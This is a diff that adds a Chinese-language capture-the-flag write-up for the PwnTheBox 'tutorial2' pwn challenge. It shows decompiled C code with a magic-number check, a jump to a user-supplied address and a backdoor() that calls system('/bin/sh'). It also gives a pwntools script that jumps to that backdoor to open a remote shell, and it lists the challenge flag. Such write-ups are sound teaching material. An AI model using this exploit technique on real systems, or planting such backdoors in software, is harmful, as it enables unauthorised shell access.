@@ -1848,6 +1848,77 @@ io.interactive()
 
 ## PwnTheBox
 
+### [tutorial2](https://ce.pwnthebox.com/challenges?type=4&id=949)
+
+先`file ./tutorial2`查看文件类型再`checksec --file=./tutorial2`检查了一下文件保护情况。
+
+使用`IDA pro 64bit`打开附件`tutorial2`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  void (*v4)(void); // [rsp+8h] [rbp-18h] BYREF
+  int buf; // [rsp+10h] [rbp-10h] BYREF
+  unsigned __int64 v6; // [rsp+18h] [rbp-8h]
+
+  v6 = __readfsqword(0x28u);
+  setbuf(stdin, 0LL);
+  setbuf(stdout, 0LL);
+  puts("'##::::'##:'########::::'#####:::'####:'##::: ##:'########:");
+  puts(". ##::'##:: ##.... ##::'##.. ##::. ##:: ###:: ##:... ##..::");
+  puts(":. ##'##::: ##:::: ##:'##:::: ##:: ##:: ####: ##:::: ##::::");
+  puts("::. ###:::: ########:: ##:::: ##:: ##:: ## ## ##:::: ##::::");
+  puts(":: ## ##::: ##.....::: ##:::: ##:: ##:: ##. ####:::: ##::::");
+  puts(": ##:. ##:: ##::::::::. ##:: ##::: ##:: ##:. ###:::: ##::::");
+  puts(" ##:::. ##: ##:::::::::. #####:::'####: ##::. ##:::: ##::::");
+  puts("..:::::..::..:::::::::::.....::::....::..::::..:::::..:::::");
+  puts("Let's try something cooler!");
+  puts("Tell me your secret number again:");
+  read(0, &buf, 4uLL);
+  if ( buf == -559038737 )  //0DEADBEEFh
+  {
+    puts("Oh, where to go?");
+    read(0, &v4, 4uLL);
+    v4();
+  }
+  else
+  {
+    puts("Well, you don't know the trick yet?");
+  }
+  return 0;
+}
+```
+
+当用户输入的`buf`变量为`0xdeadbeef`时会输出`where to go?`语句，并执行用户输入的地址所存放的函数。在`Functions window`中有一个起始地址为`0x4006E6`的`backdoor()`函数，其函数返回值直接是`system("/bin/sh")`。
+
+```c
+int backdoor()
+{
+  puts("Well done! Go get your flag!");
+  return system("/bin/sh");
+}
+```
+
+编写`Python`代码获取靶机的`shell`权限，`cat flag`拿到本题`flag`，提交`PTB{ede6ccfd-7923-41a1-8f6c-3066b1ba1bb2}`即可。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('redirect.do-not-trust.hacking.run', 10133)
+e = ELF('./tutorial2')
+io.recvuntil(':')
+io.send(p32(0xdeadbeef))
+backdoor = e.symbols['backdoor'] # 0x4006e6
+io.recvuntil('?')
+io.send(p64(backdoor))
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/PwnTheBox/949/1.png)
+
+------
+
 ### [getshell](https://ce.pwnthebox.com/challenges?type=4&id=1773)
 
 先`file ./wustctf2020_getshell`查看文件类型再`checksec --file=./wustctf2020_getshell`检查了一下文件保护情况。
